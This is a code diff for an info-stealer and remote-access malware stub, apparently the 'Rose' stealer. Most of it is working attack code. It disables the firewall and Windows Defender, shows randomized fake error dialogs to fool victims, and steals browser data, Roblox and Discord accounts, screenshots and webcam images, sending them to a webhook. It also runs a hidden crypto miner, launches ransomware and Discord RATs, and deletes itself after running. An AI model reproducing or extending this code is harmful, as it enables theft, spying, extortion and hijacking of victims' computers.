@@ -8,12 +8,10 @@ import discordc
 import subprocess
 from uac_bypass import GetSelf, IsAdmin, UACbypass
 from browser import Browsers
-from startup import Startup
+import startup
+import random
 import _roblox
-from ransomware import Rose
-import PyQt5
-import PyQt5.QtWidgets
-import PyQt5.QtCore
+import doggo_ransomware
 from config import Config
 from __webhook import _WebhookX
 from crypto_miner import miner
@@ -77,7 +75,7 @@ def send_error_notification(exception, type):
 
     embed.set_author(name=wh_name, icon_url=wh_avatar)
     embed.set_footer(text=eb_footer, icon_url=wh_avatar)
-    embed.add_field(name=f"Error in rose {type} occured | Help us by reporting this bug",
+    embed.add_field(name=f"Error in {type} occured | Help us by reporting this bug",
                     value=f'Advanced Log: ```{exception}```')
 
     webx.send(embed=embed)
@@ -87,24 +85,56 @@ class create_homefold():
         try:
             os.mkdir(main_path)
         except Exception as e:
-            send_error_notification(e, 'Home Creator')
+            send_error_notification(e, 'Rose Home Creator')
 
 if cc.get_start_up():
-    startup = Startup(cc)
-    startup.copy_to_startup()
+    try:
+        startup.Startup()
+    except Exception as e:
+        send_error_notification(e, 'Rose Startup')
 
 if cc.get_fake_error():
     try:
-        ctypes.windll.user32.MessageBoxW(0, "The program can't start because MSVCP120.dll is missing from your computer. Try reinstalling the program to fix this problem.", "DDL missing", 16)
+        error_codes = [
+            (0x800F081F, "Windows could not find the requested file. Please make sure you have the correct path and try again. If the issue persists, contact your system administrator."),
+            (0x8024001E, "An error occurred while checking for updates. Please check your internet connection and try again."),
+            (0xC000021A, "The system has encountered a critical error and needs to restart."),
+            (0x80070002, "The system cannot find the specified file."),
+            (0xC0000142, "The application failed to start correctly (0xC0000142). Click OK to close the application."),
+            (0xE000020B, "A network error occurred while trying to access the requested resource."),
+            (0x80246007, "Windows Update encountered an unknown error."),
+            (0x8007045A, "The requested operation requires elevation. Please run the program as an administrator."),
+            (0x80070005, "Access is denied. Please make sure you have the necessary permissions to access this file or directory."),
+            (0x8007007E, "The specified module could not be found. Please reinstall the program to fix this issue."),
+            (0x80244019, "An error occurred while trying to connect to the Windows Update server. Please check your internet connection."),
+            (0x800B0109, "A certificate chain processed correctly, but terminated in a root certificate which is not trusted by the trust provider."),
+            (0xC0000005, "The application was unable to start correctly (0xC0000005). Click OK to close the application."),
+            (0x80070020, "The process cannot access the file because it is being used by another process."),
+            (0x80070057, "The parameter is incorrect. Please provide valid input and try again."),
+            (0xC0000221, "The file system structure on the disk is corrupt and unusable. Please run the Chkdsk utility to fix the problem."),
+            (0x800701B1, "The drive is not ready. Please make sure a disk is inserted and try again."),
+            (0x80240036, "Software installation has been disabled on your system. Please contact your system administrator."),
+            (0xC000012F, "The system cannot find message text for message number 0x{0:X} in the message file for {1}."),
+            (0x80072EE7, "The server name or address could not be resolved. Please check your network connection."),
+            (0xC0000135, "The program can't start because %hs is missing from your computer. Try reinstalling the program to fix this problem."),
+            (0x80070091, "The directory is not empty. Please remove any files or subdirectories and try again."),
+            (0x8007000E, "Not enough storage is available to complete this operation. Please free up some space and try again."),
+            (0xC0000218, "The registry cannot load the hive (file): \\SystemRoot\\System32\\Config\\SOFTWARE or its log or alternate."),
+            (0x80040154, "Class not registered. Please make sure the file is properly registered."),
+        ]
+        
+        error_code, error_message = random.choice(error_codes)
+
+        ctypes.windll.user32.MessageBoxW(0, error_message, f"Error Code: 0x{error_code:08X}", 16)
     except Exception as e:
-        send_error_notification(e, 'Fake Error')
+        send_error_notification(e, 'Rose Fake Error')
 
 if cc.get_antivm():
     try:
         if protection_check():
             os._exit(0)
     except Exception as e:
-        send_error_notification(e, 'Anti-VM')
+        send_error_notification(e, 'Rose Anti-VM')
 
 if cc.get_uac_bypass():
     try:
@@ -114,7 +144,7 @@ if cc.get_uac_bypass():
                     subprocess.run('netsh advfirewall set domainprofile state off', shell=True)
                     subprocess.run('Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1', shell=True)
     except Exception as e:
-        send_error_notification(e, 'UAC Bypass')
+        send_error_notification(e, 'Rose UAC Bypass')
 
 if cc.get_discord_ping():
     try:
@@ -134,7 +164,7 @@ if cc.get_discord_ping():
         webx.send(embed=embed)
         webx.send('@everyone')
     except Exception as e:
-        send_error_notification(e, 'Ping')
+        send_error_notification(e, 'Rose Ping')
 
 def DecryptValue(buff, master_key=None):
     starts = buff.decode(encoding="utf8", errors="ignore")[:3]
@@ -233,25 +263,7 @@ if cc.get_browser_stealing():
     try:
         browsers = Browsers(webhook)
     except Exception as e:
-        send_error_notification(e, 'Browser Stealer')
-
-#if cc.get_steam_stealing():
-
-#if cc.get_battlenet_stealing():
-
-#if cc.get_minecraft-stealing():
-
-#if cc.get_uplay_stealing():
-
-#if cc.get_epic_stealing():
-
-#if cc.get_telegram_stealing():
-
-#if cc.get_growtopia_stealing():
-
-#if cc.get_crypto_stealing():
-
-#add spread malware, melt stub, trigger bsod, freeze screen, add exe binder, better custom img in builder, src for one file file type selection in builder, common file stealing, fix roblox stealing, add blocking of AV-Related Sites, add uac bypass, fix disable defender/firewalls or remove it & add uac bypass, fix injection, fix knight rat, make better vm detection, add stuff above, also add new deviceinf stealing
+        send_error_notification(e, 'Rose Browser Stealer')
 
 if cc.get_screenshot():
     try:
@@ -266,7 +278,7 @@ if cc.get_screenshot():
         
         os.remove(path)
     except Exception as e:
-        send_error_notification(e, 'Screenshot Stealer')
+        send_error_notification(e, 'Rose Screenshot Stealer')
     
 if cc.get_webcam():
     camlist = pygame.camera.list_cameras()
@@ -279,68 +291,77 @@ if cc.get_webcam():
             image = cam.get_image()
             path = f"{main_path}\\webcam_{rndm_strr}.png"
             pygame.image.save(image, path)
-            
+            cam.stop()
             files = {"webcam": open(path, "rb")}
             requests.post(webhook, files=files)
             files["webcam"].close()
 
             os.remove(path)
     except Exception as e:
-            send_error_notification(e, 'Webcam Stealer')
+            send_error_notification(e, 'Rose Webcam Stealer')
 
 if cc.get_deviceinf_stealing():
     try:
         send_device_information()
     except Exception as e:
-        send_error_notification(e, 'Device Data Stealing')
+        send_error_notification(e, 'Rose Device Data Stealing')
 
 if cc.get_injection():
     try:
         InjectX.InjectionX(webhook)
     except Exception as e:
-        send_error_notification(e, 'Discord Injection')
+        send_error_notification(e, 'Rose Discord Injection')
 
 if cc.get_roblox_stealing():
     try:
         _roblox.RobloxX().run()
     except Exception as e:
-        send_error_notification(e, 'Roblox Stealer')
+        send_error_notification(e, 'Rose Roblox Stealer')
 
 if cc.get_ipinf_stealing():
     try:
         Info().send_data()
     except Exception as e:
-        send_error_notification(e, 'IP & Wi-Fi Data')
+        send_error_notification(e, 'Rose IP & Wi-Fi Data')
 
 if cc.silent_crypto_miner():
     try:
         miner.run_miner()
     except Exception as e:
-        send_error_notification(e, 'Silent Crypto Miner')
+        send_error_notification(e, 'Rose Silent Crypto Miner')
 
 class remove_homefold():
     if os.path.exists(main_path):
         try:
             shutil.rmtree(main_path)
         except Exception as e:
-            send_device_information(e, 'Home Remover')
+            send_device_information(e, 'Rose Home Remover')
 
 if cc.get_ransomware():
     try:
-        app = PyQt5.QtWidgets.QApplication(sys.argv) 
-        l = Rose()
-        sys.exit(app.exec())
+        ds = doggo_ransomware.DoggoRansomware()
+        
     except Exception as e:
-        send_error_notification(e, 'Ransomware')
+        send_error_notification(e, 'Doggo Ransomware')
 
 if cc.get_knight_discord_rat():
     try:
         knight_rat.run_rat()
     except Exception as e:
-        send_error_notification(e, '| Knight Remote Access')
+        send_error_notification(e, 'Knight Remote Access')
 
 if cc.get_rose_discord_rat():
     try:
         rose_rat.run_rat()
     except Exception as e:
-        send_error_notification(e, 'Remote Access')
+        send_error_notification(e, 'Rose Remote Access')
+
+if cc.get_rose_melt_stub():
+    try:
+        path = sys.argv[0]
+
+        subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+
+        sys.exit()
+    except Exception as e:
+        send_error_notification(e, 'Rose Killer')
